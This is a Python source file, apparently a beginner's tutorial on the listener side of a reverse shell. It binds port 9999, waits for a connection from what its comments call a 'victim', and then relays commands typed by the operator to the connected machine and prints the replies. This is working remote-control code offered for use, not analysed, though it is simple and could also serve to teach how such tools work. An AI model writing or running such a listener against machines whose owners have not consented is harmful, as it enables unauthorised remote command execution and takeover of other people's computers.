import socket
import sys


# Create a Socket (Connect two Computer)
def create_socket():
    try:
        global host
        global port
        global s  # socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print('Socket Creation Error ' + str(msg))


# Binding the Socket and listening to the connection
def bind_socket():
    try:
        global host
        global port
        global s  # socket
        print('Binding the Port ' + str(port))

        s.bind((host, port))
        s.listen(5)  # to listen request of victim It can listen
        # upto 5 requests from different coputers
    except socket.error as msg:
        print('Socket Binding Error ' + str(msg) + '\n' + 'Retrying...')
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()  # It would return a connection object and address list which consist of IP address and port
    # It would not move to the next line until the client's system is connected

    print('Connection has been established! IP = ' + address[0] + ' and Port' + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))  # Command needs to be encoded into bytes as
            # when two computer communicates they communicate in bytes and not strings.
            client_response = str(conn.recv(1024),
                                  "utf-8")  # when we are sending and recieving bytes , it usually happens in chunks if data is large.
            # The chunk is usually 1024 bytes or bits depending upon
            # the network.
            # when we have got the
            # response, we have to convert it into readable format
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
